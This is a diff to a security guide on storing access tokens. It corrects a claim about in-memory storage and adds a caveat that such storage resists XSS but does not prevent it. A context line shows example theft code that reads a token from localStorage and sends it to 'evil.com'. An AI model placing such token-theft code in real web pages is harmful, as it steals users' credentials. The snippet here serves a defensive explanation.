@@ -142,9 +142,17 @@ const token = localStorage.getItem('accessToken');
 fetch('https://evil.com/steal', { body: token });
 ```
 
-With in-memory storage, the token is a JavaScript variable that XSS cannot
-access after a page reload. The refresh token in an HttpOnly cookie handles
-re-authentication transparently.
+With in-memory storage, the token is a JavaScript variable that is lost on
+page reload. The refresh token in an HttpOnly cookie handles re-authentication
+transparently.
+
+> **Important caveat:** In-memory storage is XSS-*resistant*, not XSS-*proof*.
+> If an attacker achieves XSS on your page, they can still read JavaScript
+> variables in the same execution context. In-memory storage prevents *passive*
+> token theft (malicious browser extensions, third-party scripts scanning
+> `localStorage`), but an active XSS exploit can still extract the token.
+> This is why XSS prevention (CSP headers, input sanitization, no `dangerouslySetInnerHTML`)
+> remains the primary defense — in-memory storage is a second layer, not a substitute.
 
 > **BSP 982 Section 5.4:** "Authentication credentials and session tokens shall
 > be protected from unauthorized access, including but not limited to protection
